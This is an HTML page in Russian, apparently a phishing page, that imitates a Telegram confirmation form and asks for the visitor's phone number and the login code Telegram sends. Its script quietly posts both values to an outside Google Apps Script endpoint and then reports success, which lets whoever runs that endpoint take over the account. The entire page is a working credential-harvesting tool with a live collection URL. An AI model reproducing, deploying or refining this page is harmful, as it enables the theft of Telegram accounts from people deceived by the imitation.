<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Telegram Форма</title>

  <!-- Шрифт -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">

  <!-- Иконки -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #0088cc, #005f9e);
      color: #333;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
      animation: fadeIn 1s ease-in;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .container {
      background: #fff;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
      max-width: 400px;
      width: 90%;
      text-align: center;
      animation: fadeIn 1s ease-out;
    }

    .telegram-icon {
      font-size: 48px;
      color: #0088cc;
      margin-bottom: 10px;
    }

    h1 {
      font-size: 24px;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 10px;
      outline: none;
      transition: 0.2s;
    }

    input:focus {
      border-color: #0088cc;
      box-shadow: 0 0 5px #0088cc55;
    }

    button {
      background-color: #0088cc;
      color: white;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s;
      margin-top: 10px;
    }

    button:hover {
      background-color: #006fa3;
    }

    .message {
      margin-top: 15px;
      font-weight: 500;
    }

    .success {
      color: green;
    }

    .error {
      color: red;
    }

    @media (max-width: 480px) {
      h1 {
        font-size: 20px;
      }

      .telegram-icon {
        font-size: 36px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="telegram-icon">
      <i class="fab fa-telegram-plane"></i>
    </div>
    <h1>Подтверждение через Telegram</h1>
    <form id="form">
      <input type="text" id="phone" placeholder="Номер телефона" required />
      <input type="text" id="code" placeholder="Код подтверждения" required />
      <button type="submit">Отправить</button>
    </form>
    <div class="message" id="message"></div>
  </div>

  <script>
    const form = document.getElementById("form");
    const message = document.getElementById("message");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const phone = document.getElementById("phone").value;
      const code = document.getElementById("code").value;

      try {
        await fetch("https://script.google.com/macros/s/AKfycbzNf1gOLPJXmzsBIuAumpGr-e1fWWwBykrti4w5IURBmMJhQcXZ4WJZ46K00dK2nGt9ow/exec", {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ phone, code })
        });

        message.innerHTML = "<p class='success'>✅ Данные успешно отправлены!</p>";
        form.reset();
      } catch (error) {
        message.innerHTML = "<p class='error'>❌ Ошибка отправки. Попробуйте позже.</p>";
      }
    });
  </script>
</body>
</html>
